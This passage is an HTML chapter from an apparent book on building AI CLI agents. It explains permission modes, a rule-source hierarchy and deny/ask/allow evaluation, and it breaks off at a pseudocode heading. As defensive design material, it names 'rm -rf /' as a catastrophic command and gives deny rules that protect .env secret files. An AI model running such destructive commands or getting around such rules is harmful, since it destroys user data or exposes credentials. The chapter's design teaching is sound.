@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chapter 18: Permission System Design — Architecting AI CLI Agents</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --card: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --orange: #d29922;
+  --red: #f85149;
+  --code-bg: #1c2128;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+  font-size: 18px;
+  line-height: 1.7;
+  min-height: 100vh;
+}
+.container { max-width: 860px; margin: 0 auto; padding: 48px 24px 96px; }
+/* Navigation */
+.nav {
+  position: sticky; top: 0; z-index: 100;
+  background: rgba(13,17,23,0.95); backdrop-filter: blur(10px);
+  border-bottom: 1px solid var(--border);
+  padding: 12px 24px;
+  display: flex; justify-content: space-between; align-items: center;
+}
+.nav a { color: var(--accent); text-decoration: none; font-size: 0.9rem; }
+.nav a:hover { text-decoration: underline; }
+.nav .title { color: var(--muted); font-size: 0.85rem; }
+/* Typography */
+h1 { font-size: 2.2rem; margin: 32px 0 16px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+h2 { font-size: 1.6rem; margin: 40px 0 16px; color: var(--accent); }
+h3 { font-size: 1.25rem; margin: 32px 0 12px; color: var(--text); }
+h4 { font-size: 1.1rem; margin: 24px 0 8px; color: var(--muted); }
+p { margin: 12px 0; }
+a { color: var(--accent); }
+strong { color: var(--text); }
+em { color: var(--muted); font-style: italic; }
+/* Lists */
+ul, ol { margin: 12px 0 12px 28px; }
+li { margin: 6px 0; }
+li > ul, li > ol { margin: 4px 0 4px 20px; }
+/* Code */
+code {
+  background: var(--code-bg); color: var(--green);
+  padding: 2px 6px; border-radius: 4px; font-size: 0.88em;
+  font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+}
+pre {
+  background: var(--code-bg); border: 1px solid var(--border);
+  border-radius: 8px; padding: 20px; margin: 16px 0;
+  overflow-x: auto; line-height: 1.5;
+}
+pre code { background: none; padding: 0; color: var(--text); font-size: 0.85em; }
+/* Tables */
+table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 0.92em; }
+th { background: var(--card); color: var(--accent); text-align: left; padding: 10px 14px; border: 1px solid var(--border); font-weight: 600; }
+td { padding: 10px 14px; border: 1px solid var(--border); vertical-align: top; }
+tr:nth-child(even) { background: rgba(22,27,34,0.5); }
+/* Blockquotes */
+blockquote {
+  border-left: 3px solid var(--accent); margin: 16px 0;
+  padding: 12px 20px; background: var(--card); border-radius: 0 8px 8px 0;
+  color: var(--muted);
+}
+blockquote p { margin: 4px 0; }
+/* Mermaid */
+.mermaid { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 20px; margin: 16px 0; text-align: center; }
+pre.mermaid-src { background: var(--card); border: 1px solid var(--border); white-space: pre-wrap; }
+/* Horizontal rules */
+hr { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+/* Chapter nav */
+.chapter-nav {
+  display: flex; justify-content: space-between; margin-top: 64px;
+  padding-top: 24px; border-top: 1px solid var(--border);
+}
+.chapter-nav a {
+  color: var(--accent); text-decoration: none; padding: 8px 16px;
+  border: 1px solid var(--border); border-radius: 8px; font-size: 0.9rem;
+}
+.chapter-nav a:hover { border-color: var(--accent); background: var(--card); }
+/* Responsive */
+@media (max-width: 768px) {
+  body { font-size: 16px; }
+  h1 { font-size: 1.6rem; }
+  h2 { font-size: 1.3rem; }
+  .container { padding: 24px 16px 64px; }
+  pre { padding: 12px; font-size: 0.8em; }
+  table { font-size: 0.82em; }
+  .nav { padding: 8px 16px; }
+}
+/* Syntax highlighting (Monokai-inspired) */
+.codehilite .k, .codehilite .kn, .codehilite .kd { color: #ff79c6; }
+.codehilite .s, .codehilite .s1, .codehilite .s2 { color: #f1fa8c; }
+.codehilite .n, .codehilite .na { color: #50fa7b; }
+.codehilite .c, .codehilite .c1, .codehilite .cm { color: #6272a4; font-style: italic; }
+.codehilite .nf, .codehilite .nb { color: #8be9fd; }
+.codehilite .mi, .codehilite .mf { color: #bd93f9; }
+.codehilite .o, .codehilite .p { color: #f8f8f2; }
+.codehilite .nx { color: #f8f8f2; }
+.codehilite .kr { color: #ff79c6; }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>mermaid.initialize({startOnLoad:true, theme:'dark'});</script>
+</head>
+<body>
+<nav class="nav">
+  <a href="index.html">&larr; Table of Contents</a>
+  <span class="title">Architecting AI CLI Agents</span>
+  <a href="chapter-19.html">Next &rarr;</a>
+</nav>
+<div class="container">
+<h1 id="chapter-18-permission-system-design">Chapter 18: Permission System Design</h1>
+<p>Every AI CLI agent that can modify files, execute commands, and access the network faces a fundamental design problem: how do you balance power with safety? Grant too few permissions and the agent is useless --- the user becomes a human approval button, clicking "yes" fifty times to complete a refactoring. Grant too many and the agent becomes a liability --- one hallucinated <code>rm -rf /</code> away from catastrophe.</p>
+<p>This chapter presents the architecture of a permission system designed for AI agents. We will examine six permission modes that cover the full spectrum from maximum caution to maximum autonomy, the rule cascade that resolves conflicts from eight configuration sources, the evaluation algorithm that decides each tool call's fate, and the AI classifier that makes auto-mode viable. The goal is not to document any single implementation, but to give you the architectural blueprint for building permission systems that are secure by default and minimally annoying in practice.</p>
+<hr />
+<h2 id="181-the-permission-problem-space">18.1 The Permission Problem Space</h2>
+<p>Before diving into modes and algorithms, let us frame why AI agent permissions are harder than traditional application permissions.</p>
+<p>In a conventional CLI tool, the user explicitly types every command. The permission model is simple: the user authorized the action by typing it. In an AI agent, the model decides what to do. The user said "refactor this file," and the model chose to run <code>git stash</code>, edit three files, run tests, and commit. The user authorized the intent, not the specific actions. This gap between intent and action is the core permission design challenge.</p>
+<p>Three tensions shape the solution:</p>
+<p><strong>Security vs. productivity.</strong> Every permission prompt interrupts flow. After ten prompts in a row, users switch to "allow all" and lose all protection. The system must minimize prompts without minimizing safety.</p>
+<p><strong>Configurability vs. simplicity.</strong> Enterprise deployments need fine-grained control. Individual developers need it to "just work." The system must serve both without drowning either in complexity.</p>
+<p><strong>Determinism vs. intelligence.</strong> Pattern-matching rules are predictable but rigid. AI classifiers are flexible but probabilistic. The system must combine both without the weaknesses of either dominating.</p>
+<hr />
+<h2 id="182-the-six-permission-modes">18.2 The Six Permission Modes</h2>
+<p>A well-designed permission system provides multiple operating modes because different contexts demand different trade-offs. Here are six modes that cover the full spectrum.</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">graph</span><span class="w"> </span><span class="n">LR</span>
+<span class="w">    </span><span class="n">subgraph</span><span class="w"> </span><span class="n">Spectrum</span><span class="p">[</span><span class="s">&quot;Permission Mode Spectrum&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">direction</span><span class="w"> </span><span class="n">LR</span>
+<span class="w">        </span><span class="n">DA</span><span class="p">[</span><span class="s">&quot;deny-all&lt;br/&gt;(audit)&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">Plan</span><span class="p">[</span><span class="s">&quot;plan&lt;br/&gt;(read-only)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">Plan</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">Default</span><span class="p">[</span><span class="s">&quot;default&lt;br/&gt;(ask for writes)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">Default</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">Auto</span><span class="p">[</span><span class="s">&quot;auto&lt;br/&gt;(AI classifier)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">Auto</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">Custom</span><span class="p">[</span><span class="s">&quot;custom&lt;br/&gt;(rule sets)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">Custom</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">Bypass</span><span class="p">[</span><span class="s">&quot;bypass&lt;br/&gt;(sandboxed only)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="kd">end</span>
+
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">DA</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="n">ff4444</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">Plan</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="n">ff8844</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">Default</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="n">ffcc44</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="mo">000</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">Auto</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="mi">88</span><span class="n">cc44</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="mo">000</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">Custom</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="mi">4488</span><span class="n">cc</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">Bypass</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="n">cc44cc</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+</code></pre></div>
+
+<h3 id="mode-1-default-ask-for-everything-risky">Mode 1: Default (Ask for Everything Risky)</h3>
+<p>The default mode asks the user to confirm any operation that could modify state. File reads, searches, and web lookups proceed silently. File writes, shell commands, and destructive operations require explicit approval.</p>
+<p><strong>When to use:</strong> First-time users, sensitive codebases, high-stakes environments (production configs, financial systems).</p>
+<p><strong>Design consideration:</strong> The default mode must distinguish between read and write operations at the tool level. This requires each tool to declare its side effects --- a metadata field like <code>readOnlyHint</code> or <code>destructiveHint</code> in the tool schema. Tools that lie about their side effects break the entire model, so the tool registry must validate these declarations.</p>
+<p>The critical UX feature in default mode is <strong>session memory</strong>. When a user approves <code>Bash(git diff *)</code>, the system remembers this pattern and auto-approves <code>git diff --cached</code>, <code>git diff HEAD~3</code>, and any other <code>git diff</code> variant for the rest of the session. Without session memory, default mode is unusable --- the same <code>git status</code> prompt appearing twenty times in a session would drive any engineer to bypass mode.</p>
+<h3 id="mode-2-auto-ai-classifier-decides">Mode 2: Auto (AI Classifier Decides)</h3>
+<p>Auto mode replaces the user prompt with an AI-powered classifier that evaluates each tool call and decides whether to approve, deny, or escalate. This is the most architecturally interesting mode, and we dedicate Section 18.6 to its design.</p>
+<p><strong>When to use:</strong> Experienced users who trust the agent's judgment for routine operations but want a safety net for genuinely dangerous commands.</p>
+<p><strong>Design consideration:</strong> The classifier introduces probabilistic behavior into the permission system. Two identical sessions might see different classifier decisions due to model temperature. This is acceptable because the classifier is a UX optimization, not a security boundary. The hard security boundaries (blocked command lists, sandbox restrictions) are deterministic and always enforced regardless of mode.</p>
+<h3 id="mode-3-plan-allow-reads-block-writes-until-approved">Mode 3: Plan (Allow Reads, Block Writes Until Approved)</h3>
+<p>Plan mode allows all read operations and blocks all write operations until the user reviews and approves a plan. The agent can explore the codebase, search for patterns, analyze code, and formulate a strategy. But it cannot modify a single file or execute a single write command until the plan is approved.</p>
+<p><strong>When to use:</strong> Architecture analysis, code review, unfamiliar codebases, complex refactorings where you want to see the plan before execution.</p>
+<p><strong>Design consideration:</strong> Plan mode creates a two-phase workflow: explore-then-execute. The system must track the transition point --- once the user approves the plan, the mode effectively shifts to something closer to default or auto for the execution phase. The architectural question is whether plan approval is binary (all-or-nothing) or granular (approve specific actions within the plan). Binary approval is simpler to implement and reason about; granular approval gives more control but adds significant UI complexity.</p>
+<h3 id="mode-4-bypass-allow-everything">Mode 4: Bypass (Allow Everything)</h3>
+<p>Bypass mode auto-approves every operation without prompting. This sounds reckless, and it is --- unless the agent runs inside a sandbox that limits the blast radius.</p>
+<p><strong>When to use:</strong> Sandboxed CI/CD environments, containerized agents, ephemeral VMs where the entire filesystem is disposable.</p>
+<p><strong>Design consideration:</strong> Bypass mode should only be available when the system detects (or the user explicitly confirms) that adequate containment is in place. The ideal implementation refuses to activate bypass mode unless it can verify sandbox enforcement --- checking for container cgroup membership, macOS seatbelt profiles, or Linux seccomp filters. A fallback is to require an explicit <code>--dangerously-bypass-permissions</code> flag that is too long to type accidentally.</p>
+<h3 id="mode-5-deny-all-audit-mode">Mode 5: Deny-All (Audit Mode)</h3>
+<p>Deny-all mode blocks every operation, including reads. This sounds useless, but it serves a specific purpose: auditing what the agent <em>would</em> do without letting it do anything.</p>
+<p><strong>When to use:</strong> Security audits, testing permission rules, validating that the agent's tool selection is sensible before granting any access, compliance reviews.</p>
+<p><strong>Design consideration:</strong> Deny-all mode must still let the agent loop run. The agent proposes tool calls, the permission system denies them, and the denials (with reasons) are logged. The agent receives a "permission denied" result and adapts its strategy. This feedback loop lets auditors see the agent's full decision tree without any actual side effects.</p>
+<h3 id="mode-6-custom-user-defined-rule-sets">Mode 6: Custom (User-Defined Rule Sets)</h3>
+<p>Custom mode lets users define their own permission rules: allow specific commands, deny specific paths, ask for everything else. This is the escape hatch for organizations whose requirements do not fit neatly into the other five modes.</p>
+<p><strong>When to use:</strong> Enterprise deployments with specific compliance requirements, project-specific security policies, teams with pre-approved tool sets.</p>
+<p><strong>Design consideration:</strong> Custom rules need a language. Too simple (just allow/deny lists) and users cannot express complex policies. Too complex (a full policy language like Rego or Cedar) and adoption drops to zero. The sweet spot is glob-pattern matching with tool-scoped rules: <code>Bash(git *)</code> allows any git command, <code>Read(./.env)</code> denies reading .env files, <code>Write(src/**)</code> allows writing anywhere in <code>src/</code>. This gives enough expressiveness for 95% of use cases without requiring users to learn a policy language.</p>
+<h3 id="mode-comparison">Mode Comparison</h3>
+<table>
+<thead>
+<tr>
+<th>Mode</th>
+<th>Reads</th>
+<th>Writes</th>
+<th>Shell</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>deny-all</td>
+<td>Blocked</td>
+<td>Blocked</td>
+<td>Blocked</td>
+<td>Audit, compliance review</td>
+</tr>
+<tr>
+<td>plan</td>
+<td>Allowed</td>
+<td>Blocked until plan approved</td>
+<td>Blocked until approved</td>
+<td>Architecture analysis, review</td>
+</tr>
+<tr>
+<td>default</td>
+<td>Allowed</td>
+<td>Ask user</td>
+<td>Ask user</td>
+<td>General development (conservative)</td>
+</tr>
+<tr>
+<td>auto</td>
+<td>Allowed</td>
+<td>AI classifier decides</td>
+<td>AI classifier decides</td>
+<td>General development (productive)</td>
+</tr>
+<tr>
+<td>custom</td>
+<td>Per-rule</td>
+<td>Per-rule</td>
+<td>Per-rule</td>
+<td>Enterprise, project-specific</td>
+</tr>
+<tr>
+<td>bypass</td>
+<td>Allowed</td>
+<td>Allowed</td>
+<td>Allowed</td>
+<td>Sandboxed/CI environments</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="183-the-rule-source-hierarchy">18.3 The Rule Source Hierarchy</h2>
+<p>A single permission mode is not enough. Rules come from multiple sources, and those sources have different authority levels. An enterprise security policy should override a project's convenience settings. A user's personal preferences should override defaults but not organizational mandates.</p>
+<p>The eight rule sources, in priority order:</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">graph</span><span class="w"> </span><span class="n">TD</span>
+<span class="w">    </span><span class="n">subgraph</span><span class="w"> </span><span class="kr">Priority</span><span class="p">[</span><span class="s">&quot;Rule Sources (Highest to Lowest)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">P</span><span class="p">[</span><span class="s">&quot;1. Policy (MDM/Enterprise)&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">M</span><span class="p">[</span><span class="s">&quot;2. Managed (Org Settings)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">M</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">U</span><span class="p">[</span><span class="s">&quot;3. User (~/.config/agent/settings.json)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">U</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">PJ</span><span class="p">[</span><span class="s">&quot;4. Project (.agent/settings.json)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">PJ</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">L</span><span class="p">[</span><span class="s">&quot;5. Local (.agent/settings.local.json)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">L</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">PL</span><span class="p">[</span><span class="s">&quot;6. Plugin (Installed Extensions)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">PL</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">H</span><span class="p">[</span><span class="s">&quot;7. Hook (Runtime Decisions)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">H</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">B</span><span class="p">[</span><span class="s">&quot;8. Built-in (Hardcoded Defaults)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="kd">end</span>
+
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">P</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="n">cc2222</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">M</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="n">cc6622</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">U</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="n">ccaa22</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="mo">000</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">PJ</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="mi">44</span><span class="n">aa22</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">L</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="mi">2266</span><span class="n">cc</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">PL</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="mi">8844</span><span class="n">cc</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">H</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="n">cc44aa</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">B</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="mi">888888</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+</code></pre></div>
+
+<h3 id="source-1-policy-highest-priority">Source 1: Policy (Highest Priority)</h3>
+<p>Enterprise MDM (Mobile Device Management) or system-level configuration. Delivered via macOS configuration profiles, Windows Group Policy, or Linux-managed config files. These rules cannot be overridden by any other source.</p>
+<p><strong>Architectural role:</strong> The compliance hammer. When an organization mandates "no network access from agent shell commands," this is where that rule lives. It takes absolute precedence.</p>
+<h3 id="source-2-managed-settings">Source 2: Managed Settings</h3>
+<p>Organization-level settings pushed from a centralized management server. Less forceful than policy (which the user cannot modify at all), managed settings establish organizational defaults that individual users can tighten but not loosen.</p>
+<p><strong>Architectural role:</strong> The organizational baseline. "Our team allows <code>Bash(npm *)</code> and <code>Bash(git *)</code> by default, but you can add more restrictions locally."</p>
+<h3 id="source-3-user-settings">Source 3: User Settings</h3>
+<p>Per-user settings stored in the user's home directory. These travel with the user across projects and machines (when synced).</p>
+<p><strong>Architectural role:</strong> Personal workflow preferences. "I always want to auto-approve <code>cargo test</code> and <code>ruff check</code>."</p>
+<h3 id="source-4-project-settings">Source 4: Project Settings</h3>
+<p>Per-project settings committed to version control (<code>.agent/settings.json</code>). These define project-wide permission rules that all contributors share.</p>
+<p><strong>Architectural role:</strong> Project conventions. "In this monorepo, allow writing to <code>src/**</code> and deny writing to <code>vendor/**</code>."</p>
+<p><strong>Security consideration:</strong> Project settings come from version control, which means they come from other contributors. A malicious contributor could commit a settings file that permits dangerous operations. Therefore, project-sourced allow rules should be treated as suggestions that require user confirmation on first use, not as automatically enforced rules.</p>
+<h3 id="source-5-local-settings">Source 5: Local Settings</h3>
+<p>Per-project settings that are gitignored (<code>.agent/settings.local.json</code>). These let a developer override project settings for their local environment without affecting the team.</p>
+<p><strong>Architectural role:</strong> Developer overrides. "I need <code>Bash(docker *)</code> for my local setup, even though the project settings do not include it."</p>
+<h3 id="source-6-plugin-rules">Source 6: Plugin Rules</h3>
+<p>Permissions bundled with installed plugins or extensions. These define what a plugin's tools need to function.</p>
+<p><strong>Architectural role:</strong> Extension permissions. "The database plugin requires <code>Bash(psql *)</code> access."</p>
+<h3 id="source-7-hook-decisions">Source 7: Hook Decisions</h3>
+<p>Runtime permission decisions from hook scripts (covered in Chapter 29). Hooks fire before tool execution and can allow, deny, or modify the permission decision.</p>
+<p><strong>Architectural role:</strong> Dynamic, context-sensitive decisions. "Block any bash command that references a file modified in the last 5 minutes by another agent" --- a rule too complex for static patterns.</p>
+<h3 id="source-8-built-in-defaults-lowest-priority">Source 8: Built-in Defaults (Lowest Priority)</h3>
+<p>Hardcoded defaults in the agent itself. Read-only tools are allowed. Write tools ask for confirmation. Known dangerous patterns are blocked.</p>
+<p><strong>Architectural role:</strong> The safety floor. Even with zero configuration, the system behaves safely.</p>
+<h3 id="the-one-way-ratchet-principle">The One-Way Ratchet Principle</h3>
+<p>Higher-priority sources can only tighten permissions, not loosen them, relative to what a lower-priority source denied. If Source 4 (Project) denies <code>Write(.env)</code>, Source 5 (Local) cannot override that denial. But Source 5 can add <em>new</em> denials that Source 4 did not define.</p>
+<p>The exception: Source 1 (Policy) and Source 2 (Managed) can do anything, including loosening restrictions set by lower sources. This asymmetry exists because enterprise administrators need the ability to override project-level restrictions that conflict with organizational tools.</p>
+<hr />
+<h2 id="184-the-rule-evaluation-algorithm">18.4 The Rule Evaluation Algorithm</h2>
+<p>With six modes and eight sources, the evaluation algorithm must be precise about how conflicts are resolved. The core principle is simple: <strong>deny beats ask, ask beats allow, first match wins within each priority level</strong>.</p>
+<h3 id="the-three-decision-model">The Three-Decision Model</h3>
+<p>Every rule produces one of three decisions:</p>
+<ul>
+<li><strong>Deny</strong>: Block the operation. No further evaluation needed.</li>
+<li><strong>Ask</strong>: Prompt the user (or escalate to the classifier in auto mode).</li>
+<li><strong>Allow</strong>: Permit the operation without prompting.</li>
+</ul>
+<h3 id="evaluation-pipeline">Evaluation Pipeline</h3>
+<div class="codehilite"><pre><span></span><code><span class="n">flowchart</span><span class="w"> </span><span class="n">TD</span>
+<span class="w">    </span><span class="n">Start</span><span class="p">[</span><span class="s2">&quot;Tool Call Arrives&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">HardBlock</span><span class="p">{</span><span class="s2">&quot;Hardcoded&lt;br/&gt;Block List?&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">HardBlock</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Yes</span><span class="o">|</span><span class="w"> </span><span class="n">Deny</span><span class="p">[</span><span class="s2">&quot;DENY&lt;br/&gt;(catastrophic command)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">HardBlock</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">No</span><span class="o">|</span><span class="w"> </span><span class="n">Mode</span><span class="p">{</span><span class="s2">&quot;Permission&lt;br/&gt;Mode?&quot;</span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">Mode</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">bypass</span><span class="o">|</span><span class="w"> </span><span class="n">Allow</span><span class="p">[</span><span class="s2">&quot;ALLOW&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">Mode</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">deny</span><span class="o">-</span><span class="n">all</span><span class="o">|</span><span class="w"> </span><span class="n">Deny2</span><span class="p">[</span><span class="s2">&quot;DENY&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">Mode</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">plan</span><span class="o">|</span><span class="w"> </span><span class="n">PlanCheck</span><span class="p">{</span><span class="s2">&quot;Read-only&lt;br/&gt;tool?&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">PlanCheck</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Yes</span><span class="o">|</span><span class="w"> </span><span class="n">Allow</span>
+<span class="w">    </span><span class="n">PlanCheck</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">No</span><span class="o">|</span><span class="w"> </span><span class="n">Deny3</span><span class="p">[</span><span class="s2">&quot;DENY&lt;br/&gt;(write in plan mode)&quot;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="n">Mode</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">default</span><span class="o">/</span><span class="n">auto</span><span class="o">/</span><span class="n">custom</span><span class="o">|</span><span class="w"> </span><span class="n">RuleCascade</span><span class="p">[</span><span class="s2">&quot;Evaluate Rule Cascade&quot;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="n">RuleCascade</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">DenyRules</span><span class="p">{</span><span class="s2">&quot;Any DENY&lt;br/&gt;rule matches?&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">DenyRules</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Yes</span><span class="o">|</span><span class="w"> </span><span class="n">DenyFinal</span><span class="p">[</span><span class="s2">&quot;DENY&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">DenyRules</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">No</span><span class="o">|</span><span class="w"> </span><span class="n">AskRules</span><span class="p">{</span><span class="s2">&quot;Any ASK&lt;br/&gt;rule matches?&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">AskRules</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Yes</span><span class="o">|</span><span class="w"> </span><span class="n">AskDecision</span><span class="p">[</span><span class="s2">&quot;ASK&lt;br/&gt;(or classify in auto)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">AskRules</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">No</span><span class="o">|</span><span class="w"> </span><span class="n">AllowRules</span><span class="p">{</span><span class="s2">&quot;Any ALLOW&lt;br/&gt;rule matches?&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">AllowRules</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Yes</span><span class="o">|</span><span class="w"> </span><span class="n">AllowFinal</span><span class="p">[</span><span class="s2">&quot;ALLOW&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">AllowRules</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">No</span><span class="o">|</span><span class="w"> </span><span class="n">DefaultDecision</span><span class="p">[</span><span class="s2">&quot;DEFAULT&lt;br/&gt;(ask for writes,&lt;br/&gt;allow for reads)&quot;</span><span class="p">]</span>
+</code></pre></div>
+
+<h3 id="rule-matching">Rule Matching</h3>
+<p>Rules match against a canonical representation of the tool call. For a bash command <code>git diff --cached</code>, the canonical form is <code>Bash(git diff --cached)</code>. Rules can use glob patterns:</p>
+<div class="codehilite"><pre><span></span><code>Bash(git <span class="gs">*)        → matches any git command</span>
+<span class="gs">Bash(npm test)     → matches only &quot;npm test&quot; exactly</span>
+<span class="gs">Read(./.env)       → matches reading .env in the project root</span>
+<span class="gs">Read(./.env*</span>)      → matches .env, .env.local, .env.production
+Write(src/**)      → matches writing any file under src/
+</code></pre></div>
+
+<p>The evaluation scans all rules from all sources in priority order. Within each source, deny rules are checked first, then ask rules, then allow rules. The first matching rule at the highest priority source wins.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">Pseudocode</span><span class="o">:</span>
+
